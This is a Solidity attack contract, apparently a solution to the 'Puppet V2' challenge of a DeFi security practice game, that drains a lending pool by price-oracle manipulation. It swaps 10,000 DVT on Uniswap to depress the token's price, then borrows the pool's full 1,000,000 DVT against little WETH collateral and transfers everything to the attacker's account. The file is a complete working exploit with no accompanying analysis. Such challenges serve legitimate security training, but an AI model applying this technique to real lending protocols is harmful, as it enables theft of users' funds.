// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IUniswapV2Router {
    function WETH() external pure returns (address);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IPool {
    function borrow(uint256 amount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}


contract AttackPuppetV2 {

    uint256 private constant DUMP_DVT_AMOUNT = 10000 ether;
    uint256 private constant BORROW_DVT_AMOUNT = 1000000 ether;

    address private immutable player;
    IPool private immutable pool;
    IUniswapV2Router private immutable router;
    IERC20 private immutable token;
    IWETH private immutable weth;

    constructor(address _pool, address _router, address _token){
        player = msg.sender;
        pool = IPool(_pool);
        router = IUniswapV2Router(_router);
        token = IERC20(_token);
        weth = IWETH(router.WETH());
    }

    function attack() external payable {

        require(msg.sender == player);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        // Swap 10k DVT tokens for WETH using Uniswap
        token.approve(address(router), DUMP_DVT_AMOUNT);
        router.swapExactTokensForTokens(
            DUMP_DVT_AMOUNT,
            9 ether,
            path,
            address(this),
            block.timestamp
        );

        // Convert ETH to WETH
        weth.deposit{value: address(this).balance}();

        // Calculate how many WETH we need to approve to borrow all DVT tokens
        uint256 requiredWeth = pool.calculateDepositOfWETHRequired(BORROW_DVT_AMOUNT);
        console.log("Contract WETH Balance: ", weth.balanceOf(address(this)));
        console.log("Required WETH: ", requiredWeth);

        // Approve the pool to spend our WETH and ask to borrow all DVT
        weth.approve(address(pool), weth.balanceOf(address(this)));
        pool.borrow(BORROW_DVT_AMOUNT);

        // Send all DVT tokens and WETH to the player (EOA account)
        token.transfer(player, token.balanceOf(address(this)));
        weth.transfer(player, weth.balanceOf(address(this)));
    }

    
    receive() external payable {}
}